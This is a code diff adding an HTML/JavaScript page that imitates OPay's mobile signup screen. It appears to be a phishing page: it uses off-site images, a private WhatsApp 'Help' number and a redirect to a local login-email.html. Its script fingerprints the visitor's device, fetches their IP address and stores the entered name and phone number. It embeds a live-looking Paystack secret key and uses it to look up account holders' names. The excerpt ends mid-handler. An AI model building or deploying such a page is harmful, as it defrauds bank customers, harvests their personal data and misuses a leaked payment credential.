@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Get an OPay Account</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* ===== THEME VARIABLES ===== */
+        :root {
+            /* Light theme (default) */
+            --bg-color: #f8f8fb;
+            --text-color: #212121;
+            --card-bg: #ffffff;
+            --input-bg: #EFEFF5;
+            --border-color: #E0E0E0;
+            --placeholder-color: #9E9E9E;
+            --secondary-text: #616161;
+            --accent-color: #00B876;
+            --accent-light: #E8F5E9;
+            --keypad-bg: #f8f8fb;
+            --key-bg: #ffffff;
+            --success-bg: #E0F7EE;
+            --error-bg: #fee2e2;
+            --error-color: #dc2626;
+            --header-bg: #ffffff;
+            --tab-inactive: #000000;
+            --event-bg: #FFFFFF;
+            --event-border: #f5f5f5;
+            --empty-state-color: #9e9e9e;
+            --network-monitor-bg: #FFFFFF;
+            --free-transfer-bg: #F6EDFF;
+            --free-transfer-text: #4527a0;
+            --free-count-color: #673ab7;
+            --modal-overlay: rgba(0,0,0,0.5);
+            --modal-bg: #ffffff;
+            --modal-text: #212121;
+            --modal-btn-bg: #00B876;
+        }
+
+        /* Dark theme – activated by class on body */
+        body.dark-theme {
+            --bg-color: #121212;
+            --text-color: #e0e0e0;
+            --card-bg: #1e1e1e;
+            --input-bg: #2d2d2d;
+            --border-color: #333333;
+            --placeholder-color: #757575;
+            --secondary-text: #b0b0b0;
+            --accent-color: #1e9c43;
+            --accent-light: #2a4a2a;
+            --keypad-bg: #121212;
+            --key-bg: #2d2d2d;
+            --success-bg: #1c3b2f;
+            --error-bg: #451f1f;
+            --error-color: #f87171;
+            --header-bg: #1e1e1e;
+            --tab-inactive: #b0b0b0;
+            --event-bg: #1e1e1e;
+            --event-border: #333333;
+            --empty-state-color: #757575;
+            --network-monitor-bg: #2d2d2d;
+            --free-transfer-bg: #2d2d2d;
+            --free-transfer-text: #d0b8ff;
+            --free-count-color: #a98ae6;
+            --modal-overlay: rgba(0,0,0,0.7);
+            --modal-bg: #2d2d2d;
+            --modal-text: #e0e0e0;
+            --modal-btn-bg: #1e9c43;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 414px;
+            height: 100vh;
+            max-height: 896px;
+            background-color: var(--card-bg);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            border-radius: 24px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+            background-color: var(--header-bg);
+        }
+
+        .back-icon {
+            width: 22px;
+            height: 22px;
+            stroke: currentColor;
+            stroke-width: 2;
+            fill: none;
+            cursor: pointer;
+        }
+
+        .theme-toggle {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            color: var(--accent-color);
+            margin-right: 16px;
+        }
+
+        .help-link {
+            color: var(--accent-color);
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .main-content {
+            flex: 1;
+            overflow-y: auto;
+            padding: 0 24px 8px;
+            scrollbar-width: none;
+        }
+
+        .main-content::-webkit-scrollbar {
+            display: none;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: var(--text-color);
+        }
+
+        .bank-selector {
+            display: none;
+        }
+
+        .phone-input-container {
+            border: 1px solid var(--accent-color);
+            border-radius: 15px;
+            padding: 16px 18px;
+            background-color: var(--input-bg);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+
+        .flag-code {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            border-right: 2px solid var(--border-color);
+            padding-right: 10px;
+        }
+
+        .flag-code img {
+            width: 25px;
+            height: 23px;
+            object-fit: cover;
+            border-radius: 3px;
+        }
+
+        .flag-code span {
+            font-weight: 500;
+            font-size: 15px;
+            color: var(--text-color);
+        }
+
+        .phone-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            outline: none;
+            font-size: 15px;
+            color: var(--text-color);
+        }
+
+        .phone-input::placeholder {
+            color: var(--placeholder-color);
+        }
+
+        .verify-dropdown {
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            display: none;
+        }
+
+        .verify-dropdown.visible {
+            display: block;
+        }
+
+        .verify-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+        }
+
+        .verify-item:not(:last-child) {
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .verify-icon {
+            width: 40px;
+            height: 40px;
+            background-color: var(--accent-light);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent-color);
+            font-weight: 600;
+        }
+
+        .verify-details {
+            flex: 1;
+        }
+
+        .verify-name {
+            font-weight: 600;
+            color: var(--text-color);
+            font-size: 15px;
+        }
+
+        .verify-phone {
+            font-size: 15px;
+            color: var(--secondary-text);
+        }
+
+        .verify-bank {
+            font-size: 13px;
+            color: var(--accent-color);
+            margin-top: 2px;
+        }
+
+        .loader-small {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--border-color);
+            border-top-color: var(--accent-color);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 13px;
+            text-align: center;
+            padding: 8px;
+        }
+
+        .invite-btn {
+            background-color: var(--accent-light);
+            border-radius: 10px;
+            padding: 5px 7px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            color: var(--secondary-text);
+            font-size: 10px;
+            margin-bottom: 0;
+        }
+
+        .invite-btn .left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .invite-btn svg {
+            width: 16px;
+            height: 16px;
+            stroke: var(--accent-color);
+            fill: none;
+            stroke-width: 2;
+        }
+
+        .chevron {
+            width: 14px;
+            height: 14px;
+            stroke: currentColor;
+            fill: none;
+            transition: transform 0.3s;
+        }
+
+        .chevron.rotate {
+            transform: rotate(180deg);
+        }
+
+        .invite-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease-out;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-top: none;
+            border-radius: 0 0 20px 20px;
+        }
+
+        .invite-content.open {
+            max-height: 70px;
+        }
+
+        .invite-input {
+            width: 100%;
+            padding: 12px 14px;
+            background: transparent;
+            border: none;
+            outline: none;
+            color: var(--text-color);
+            font-size: 13px;
+        }
+
+        .promo-badge {
+            background-color: var(--accent-light);
+            color: var(--accent-color);
+            padding: 6px 14px;
+            border-radius: 5px;
+            font-weight: 600;
+            font-size: 12px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+            margin: 6px 0 0px 0;
+        }
+
+        .promo-badge img {
+            width: 16px;
+            height: 16px;
+        }
+
+        .next-btn {
+            width: 100%;
+            background-color: var(--accent-color);
+            color: white;
+            font-weight: 700;
+            font-size: 16px;
+            padding: 14px;
+            border-radius: 40px;
+            border: none;
+            opacity: 0.5;
+            cursor: not-allowed;
+            transition: opacity 0.2s;
+            margin-bottom: 22px;
+        }
+
+        .next-btn.enabled {
+            opacity: 1;
+            cursor: pointer;
+        }
+
+        .terms-container {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .custom-checkbox {
+            appearance: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid var(--accent-color);
+            border-radius: 4px;
+            position: relative;
+            cursor: pointer;
+            flex-shrink: 0;
+            background-color: var(--card-bg);
+        }
+
+        .custom-checkbox:checked {
+            background-color: var(--accent-color);
+        }
+
+        .custom-checkbox:checked::after {
+            content: '✓';
+            color: white;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 12px;
+        }
+
+        .terms-label {
+            font-size: 11px;
+            line-height: 1.4;
+            color: var(--secondary-text);
+            cursor: pointer;
+        }
+
+        .terms-label .underline {
+            color: var(--accent-color);
+        }
+
+        .login-link {
+            text-align: center;
+            color: var(--secondary-text);
+            font-size: 14px;
+            padding-bottom: 12px;
+            font-weight: 600;
+        }
+
+        .login-link span {
+            color: var(--accent-color);
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .keypad-section {
+            display: none;
+            background-color: var(--keypad-bg);
+            padding: 12px 10px 10px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .keypad-section.visible {
+            display: block;
+        }
+
+        .keypad-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            padding: 0 90px;
+        }
+
+        .secure {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: var(--secondary-text);
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .secure svg {
+            width: 16px;
+            height: 16px;
+            stroke: var(--accent-color);
+            stroke-width: 2.5;
+            fill: none;
+        }
+
+        .done {
+            color: var(--accent-color);
+            font-weight: 400;
+            font-size: 14px;
+            cursor: pointer;
+            margin-right: -72px;
+        }
+
+        .keypad-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 6px;
+        }
+
+        .keypad-btn {
+            background-color: var(--key-bg);
+            border-radius: 2px;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: 400;
+            color: var(--text-color);
+            cursor: pointer;
+            user-select: none;
+            transition: background 0.1s;
+        }
+
+        .keypad-btn:active {
+            background-color: var(--accent-light);
+        }
+
+        .keypad-btn.empty {
+            visibility: hidden;
+        }
+
+        .keypad-btn svg {
+            width: 22px;
+            height: 22px;
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        /* ===== GREEN CIRCLE LOADER ===== */
+        .loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        .loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .green-ring {
+            position: relative;
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            background-color: #1e9c43;
+            border: none;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-wrapper {
+            width: 35px;
+            height: 35px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 50%;
+            background: white;
+            box-shadow: 0 4px 0px rgba(0, 0, 0, 0.05);
+            animation: pulse-zoom 0.7s ease-in-out infinite;
+            z-index: 3;
+        }
+
+        .logo-image {
+            width: 25px;
+            height: 25px;
+            object-fit: contain;
+            border-radius: 50%;
+        }
+
+        .orbit {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            animation: rotate-dot 1.5s linear infinite;
+            transform-origin: center center;
+            z-index: 2;
+        }
+
+        .dot {
+            position: absolute;
+            top: 25px;
+            left: 100%;
+            transform: translateX(-1300%);
+            width: 1px;
+            height: 1px;
+            background: white;
+            border-radius: 60%;
+            box-shadow: 0 0 8px 9px rgba(255, 255, 255, 0.5);
+        }
+
+        @keyframes pulse-zoom {
+            0% {
+                transform: scale(1.03);
+                opacity: 0.8;
+                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            }
+            50% {
+                transform: scale(1.15);
+                opacity: 1;
+                box-shadow: 0 10px 20px rgba(5, 150, 105, 0.15);
+            }
+            100% {
+                transform: scale(1.03);
+                opacity: 0.8;
+                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            }
+        }
+
+        @keyframes rotate-dot {
+            from { transform: rotate(0deg); }
+            to   { transform: rotate(360deg); }
+        }
+
+        /* ===== ALERT MODAL ===== */
+        .alert-modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--modal-overlay);
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+        }
+
+        .alert-modal {
+            background: var(--modal-bg);
+            border-radius: 24px;
+            width: 85%;
+            max-width: 320px;
+            padding: 24px 20px 28px;
+            text-align: center;
+            animation: fadeIn 0.2s ease;
+        }
+
+        .alert-icon {
+            width: 56px;
+            height: 56px;
+            background: #fff2e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .alert-icon svg {
+            width: 32px;
+            height: 32px;
+            stroke: #f5a623;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        .alert-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--modal-text);
+            margin-bottom: 12px;
+        }
+
+        .alert-message {
+            font-size: 14px;
+            color: var(--secondary-text);
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+
+        .alert-login-btn {
+            background: var(--modal-btn-bg);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <div class="header">
+            <svg class="back-icon" viewBox="0 0 24 24">
+                <path d="M15 18l-6-6 6-6"/>
+            </svg>
+            <div style="display: flex; align-items: center;">
+                <svg id="themeToggle" class="theme-toggle" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="5"></circle>
+                    <line x1="12" y1="1" x2="12" y2="3"></line>
+                    <line x1="12" y1="21" x2="12" y2="23"></line>
+                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                    <line x1="1" y1="12" x2="3" y2="12"></line>
+                    <line x1="21" y1="12" x2="23" y2="12"></line>
+                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                </svg>
+                <span class="help-link" id="helpBtn">Help</span>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="title">Get an OPay Account</div>
+
+            <div class="bank-selector">
+                <select id="bankSelect" class="bank-dropdown" disabled>
+                    <option value="">Loading OPay...</option>
+                </select>
+            </div>
+
+            <div class="phone-input-container">
+                <div class="flag-code">
+                    <img src="https://image.qwenlm.ai/public_source/5044b446-576c-451b-99cf-d1930f366b0f/15e97f948-6228-4548-a630-79912bdef821.png" alt="Nigeria Flag">
+                    <span>+234</span>
+                </div>
+                <input type="tel" id="phoneInput" class="phone-input" placeholder="Enter 10-digit OPay account number" readonly value="">
+            </div>
+
+            <div id="verifyDropdown" class="verify-dropdown">
+                <div id="verifyLoading" class="loader-small" style="display: none;"></div>
+                <div id="verifyError" class="error-message" style="display: none;"></div>
+                <div id="verifyContent" style="display: none;">
+                    <div class="verify-item">
+                        <div class="verify-icon">OP</div>
+                        <div class="verify-details">
+                            <div class="verify-name" id="accountName"></div>
+                            <div class="verify-phone" id="accountPhone"></div>
+                            <div class="verify-bank" id="accountBankName">OPay Digital Services</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div style="margin-bottom: 80px;">
+                <div class="invite-btn" onclick="toggleInvitation()">
+                    <div class="left">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                            <circle cx="12" cy="7" r="4"></circle>
+                        </svg>
+                       <span>Have an Invitation Code? (Optional)</span>
+                    </div>
+                    <svg id="chevronIcon" class="chevron" viewBox="0 0 24 24">
+                        <path d="M6 9l6 6 6-6"/>
+                    </svg>
+                </div>
+                <div id="inviteContent" class="invite-content">
+                    <input type="text" class="invite-input" placeholder="Enter invitation code">
+                </div>
+            </div>
+
+            <div style="display: flex; justify-content: center;">
+                <div class="promo-badge">
+                    <img src="https://image.qwenlm.ai/public_source/5044b446-576c-451b-99cf-d1930f366b0f/1b4b91a39-88af-4564-b2a2-bf05bed73851.png" alt="Money">
+                    Get ₦300 airtime voucher
+                </div>
+            </div>
+
+            <button id="nextBtn" class="next-btn" disabled>NEXT</button>
+
+            <div class="terms-container">
+                <input type="checkbox" id="termsCheck" class="custom-checkbox">
+                <label for="termsCheck" class="terms-label">
+                    I have read, understood and agreed to the <span class="underline">Terms & Conditions</span> and <span class="underline">Privacy Policy</span>.
+                </label>
+            </div>
+
+            <div class="login-link">
+                Already have an OPay Account? <span id="loginLink">Log in</span>
+            </div>
+        </div>
+
+        <div id="keypadSection" class="keypad-section">
+            <div class="keypad-header">
+                <div class="secure">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                        <path d="M9 12l2 2 4-4"></path>
+                    </svg>
+                    OPay Secure Numeric Keypad
+                </div>
+                <span class="done" onclick="hideKeypad()">Done</span>
+            </div>
+
+            <div class="keypad-grid">
+                <div class="keypad-btn" onclick="addNumber('1')">1</div>
+                <div class="keypad-btn" onclick="addNumber('2')">2</div>
+                <div class="keypad-btn" onclick="addNumber('3')">3</div>
+                <div class="keypad-btn" onclick="addNumber('4')">4</div>
+                <div class="keypad-btn" onclick="addNumber('5')">5</div>
+                <div class="keypad-btn" onclick="addNumber('6')">6</div>
+                <div class="keypad-btn" onclick="addNumber('7')">7</div>
+                <div class="keypad-btn" onclick="addNumber('8')">8</div>
+                <div class="keypad-btn" onclick="addNumber('9')">9</div>
+                <div class="keypad-btn empty"></div>
+                <div class="keypad-btn" onclick="addNumber('0')">0</div>
+                <div class="keypad-btn" onclick="deleteNumber()">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                        <line x1="18" y1="9" x2="12" y2="15"></line>
+                        <line x1="12" y1="9" x2="18" y2="15"></line>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Alert Modal for Existing User (no longer shown automatically, left for other possible uses) -->
+    <div id="alertModal" class="alert-modal-overlay">
+        <div class="alert-modal">
+            <div class="alert-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="8" x2="12" y2="12"></line>
+                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                </svg>
+            </div>
+            <div class="alert-title">Account Already Exists</div>
+            <div class="alert-message">You already have an OPay account. Please log in instead.</div>
+            <button id="alertLoginBtn" class="alert-login-btn">Log In</button>
+        </div>
+    </div>
+
+    <!-- ===== GREEN CIRCLE LOADER ===== -->
+    <div id="loadingPopup" class="loader">
+        <div class="loader-container">
+            <div class="green-ring">
+                <div class="orbit">
+                    <div class="dot"></div>
+                </div>
+                <div class="logo-wrapper">
+                    <img src="https://iili.io/qT81u1e.png" alt="Loading Logo" class="logo-image">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            // ========== SAFE DEVICE FINGERPRINT (FIXED) ==========
+            function getDeviceFingerprint() {
+                // Safely access screen properties with fallback values
+                let width = 0, height = 0, colorDepth = 24;
+                if (typeof screen !== 'undefined') {
+                    width = screen.width || 0;
+                    height = screen.height || 0;
+                    colorDepth = screen.colorDepth || 24;
+                }
+                const screenStr = `${width}x${height}x${colorDepth}`;
+
+                const ua = navigator.userAgent;
+                const lang = navigator.language || navigator.userLanguage;
+                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const fingerprint = `${ua}|${screenStr}|${lang}|${tz}`;
+                let hash = 0;
+                for (let i = 0; i < fingerprint.length; i++) {
+                    const char = fingerprint.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash |= 0;
+                }
+                return hash.toString();
+            }
+
+            // ========== THEME TOGGLE ==========
+            const themeToggle = document.getElementById('themeToggle');
+            const body = document.body;
+            const savedTheme = localStorage.getItem('theme');
+            if (savedTheme === 'dark') {
+                body.classList.add('dark-theme');
+                themeToggle.innerHTML = `<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>`;
+            } else {
+                themeToggle.innerHTML = `
+                    <circle cx="12" cy="12" r="5"></circle>
+                    <line x1="12" y1="1" x2="12" y2="3"></line>
+                    <line x1="12" y1="21" x2="12" y2="23"></line>
+                    <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                    <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                    <line x1="1" y1="12" x2="3" y2="12"></line>
+                    <line x1="21" y1="12" x2="23" y2="12"></line>
+                    <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                    <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                `;
+            }
+
+            themeToggle.addEventListener('click', () => {
+                if (body.classList.contains('dark-theme')) {
+                    body.classList.remove('dark-theme');
+                    localStorage.setItem('theme', 'light');
+                    themeToggle.innerHTML = `
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    `;
+                } else {
+                    body.classList.add('dark-theme');
+                    localStorage.setItem('theme', 'dark');
+                    themeToggle.innerHTML = `<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>`;
+                }
+            });
+
+            // ========== Help Button: WhatsApp ==========
+            document.getElementById('helpBtn').addEventListener('click', () => {
+                window.open('https://wa.me/2349116125762?text=Hello%2C%20I%20need%20help%20with%20OPay%20account%20creation.', '_blank');
+            });
+
+            // ========== Login Link: redirect to login-email.html ==========
+            document.getElementById('loginLink').addEventListener('click', () => {
+                window.location.href = 'login-email.html';
+            });
+
+            // ========== Alert Modal (not used automatically, but kept for any manual trigger) ==========
+            const alertModal = document.getElementById('alertModal');
+            const alertLoginBtn = document.getElementById('alertLoginBtn');
+            alertLoginBtn.addEventListener('click', () => {
+                alertModal.style.display = 'none';
+                window.location.href = 'login-email.html';
+            });
+
+            // ========== Paystack Configuration ==========
+            const SECRET_KEY = 'sk_live_982c3772d00d6c6f0219ac6241d9747f581421e8';
+            const BASE_URL = 'https://api.paystack.co';
+            const headers = {
+                'Authorization': `Bearer ${SECRET_KEY}`,
+                'Content-Type': 'application/json'
+            };
+
+            const bankSelect = document.getElementById('bankSelect');
+            const phoneInput = document.getElementById('phoneInput');
+            const nextBtn = document.getElementById('nextBtn');
+            const termsCheck = document.getElementById('termsCheck');
+            const inviteContent = document.getElementById('inviteContent');
+            const chevronIcon = document.getElementById('chevronIcon');
+            const keypadSection = document.getElementById('keypadSection');
+            const verifyDropdown = document.getElementById('verifyDropdown');
+            const verifyLoading = document.getElementById('verifyLoading');
+            const verifyError = document.getElementById('verifyError');
+            const verifyContent = document.getElementById('verifyContent');
+            const accountNameSpan = document.getElementById('accountName');
+            const accountPhoneSpan = document.getElementById('accountPhone');
+            const accountBankNameSpan = document.getElementById('accountBankName');
+
+            let isLoading = false;
+            let debounceTimer = null;
+            let opayBankCode = null;
+
+            async function fetchOpayBank() {
+                try {
+                    const response = await fetch(`${BASE_URL}/bank`, { headers });
+                    const result = await response.json();
+                    if (result.status && result.data) {
+                        const opay = result.data.find(bank => 
+                            bank.name.toLowerCase().includes('opay') || 
+                            bank.name.toLowerCase().includes('opay digital services')
+                        );
+                        if (opay) {
+                            opayBankCode = opay.code;
+                            bankSelect.innerHTML = '';
+                            const option = document.createElement('option');
+                            option.value = opay.code;
+                            option.textContent = opay.name;
+                            option.selected = true;
+                            bankSelect.appendChild(option);
+                            bankSelect.disabled = false;
+                        } else {
+                            throw new Error('OPay bank not found');
+                        }
+                    } else {
+                        throw new Error('Failed to load banks');
+                    }
+                } catch (err) {
+                    console.error('Error fetching OPay:', err);
+                    bankSelect.innerHTML = '<option value="">OPay not available</option>';
+                }
+            }
+            fetchOpayBank();
+
+            function setLoading(loading) {
+                isLoading = loading;
+                if (loading) {
+                    verifyDropdown.classList.add('visible');
+                    verifyLoading.style.display = 'block';
+                    verifyError.style.display = 'none';
+                    verifyContent.style.display = 'none';
+                } else {
+                    verifyLoading.style.display = 'none';
+                }
+            }
+
+            function displayResult(data, error = null) {
+                verifyLoading.style.display = 'none';
+                if (error) {
+                    verifyError.textContent = error;
+                    verifyError.style.display = 'block';
+                    verifyContent.style.display = 'none';
+                } else if (data && data.account_name) {
+                    accountNameSpan.textContent = data.account_name.toUpperCase();
+                    const formattedPhone = phoneInput.value.replace(/(\d{4})(\d{3})(\d{3})/, '$1 $2 $3');
+                    accountPhoneSpan.textContent = `+234 ${formattedPhone}`;
+                    const selectedOption = bankSelect.options[bankSelect.selectedIndex];
+                    accountBankNameSpan.textContent = selectedOption ? selectedOption.textContent : 'OPay Digital Services';
+                    verifyContent.style.display = 'block';
+                    verifyError.style.display = 'none';
+                } else {
+                    verifyError.textContent = 'No account name returned';
+                    verifyError.style.display = 'block';
+                    verifyContent.style.display = 'none';
+                }
+                updateButtonState();
+            }
+
+            async function verifyAccount() {
+                const accountNumber = phoneInput.value.trim();
+                const bankCode = bankSelect.value;
+                if (accountNumber.length !== 10 || !/^\d+$/.test(accountNumber) || !bankCode) return;
+
+                setLoading(true);
+                try {
+                    const url = `${BASE_URL}/bank/resolve?account_number=${accountNumber}&bank_code=${bankCode}`;
+                    const response = await fetch(url, { headers });
+                    const result = await response.json();
+
+                    if (!response.ok || !result.status) {
+                        let errorMsg = result.message || `Verification failed (${response.status})`;
+                        throw new Error(errorMsg);
+                    }
+
+                    displayResult(result.data);
+                } catch (err) {
+                    console.error('Verification error:', err);
+                    displayResult(null, err.message || 'Unable to verify account. Please check the number or try again.');
+                } finally {
+                    setLoading(false);
+                }
+            }
+
+            function updateButtonState() {
+                const isVerified = verifyContent.style.display === 'block';
+                const termsAccepted = termsCheck.checked;
+                if (isVerified && termsAccepted) {
+                    nextBtn.disabled = false;
+                    nextBtn.classList.add('enabled');
+                } else {
+                    nextBtn.disabled = true;
+                    nextBtn.classList.remove('enabled');
+                }
+            }
+
+            function triggerAutoVerify() {
+                clearTimeout(debounceTimer);
+                const accountValid = phoneInput.value.trim().length === 10 && /^\d+$/.test(phoneInput.value.trim()) && bankSelect.value;
+                if (accountValid && !isLoading) {
+                    debounceTimer = setTimeout(() => {
+                        verifyAccount();
+                    }, 600);
+                } else if (!accountValid) {
+                    verifyDropdown.classList.remove('visible');
+                }
+            }
+
+            bankSelect.addEventListener('change', triggerAutoVerify);
+
+            window.toggleInvitation = function() {
+                inviteContent.classList.toggle('open');
+                chevronIcon.classList.toggle('rotate');
+            };
+
+            phoneInput.addEventListener('focus', () => {
+                keypadSection.classList.add('visible');
+            });
+
+            window.hideKeypad = function() {
+                keypadSection.classList.remove('visible');
+                phoneInput.blur();
+            };
+
+            document.addEventListener('click', (e) => {
+                if (!keypadSection.contains(e.target) && e.target !== phoneInput && !phoneInput.contains(e.target)) {
+                    keypadSection.classList.remove('visible');
+                }
+            });
+
+            window.addNumber = function(num) {
+                if (phoneInput.value.length < 10) {
+                    phoneInput.value += num;
+                    triggerAutoVerify();
+                    updateButtonState();
+                }
+            };
+
+            window.deleteNumber = function() {
+                phoneInput.value = phoneInput.value.slice(0, -1);
+                triggerAutoVerify();
+                updateButtonState();
+            };
+
+            termsCheck.addEventListener('change', updateButtonState);
+
+            function showLoader(show) {
+                const loader = document.getElementById('loadingPopup');
+                if (loader) loader.style.display = show ? 'flex' : 'none';
+            }
+
+            async function fetchUserIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Failed to fetch IP:', error);
+                    return 'unknown';
+                }
+            }
+
+            nextBtn.addEventListener('click', async (e) => {
+                if (!nextBtn.disabled) {
+                    // REMOVED the existing user fingerprint check – allow all users to proceed
+                    const fullName = accountNameSpan.textContent;
+                    const phoneDigits = phoneInput.value;
+                    const fullPhone = '0' + phoneDigits;
+                    const firstName = fullName.split(' ')[0] || 'User';
+                    const bankCode = bankSelect.value;
+                    const bankName = bankSelect.options[bankSelect.selectedIndex].textContent;
+                    const accountNumber = phoneDigits;
+
+                    localStorage.setItem('opayUserFullName', fullName);
+                    localStorage.setItem('opayUserFirstName', firstName);
+                    localStorage.setItem('opayUserPhone', fullPhone);
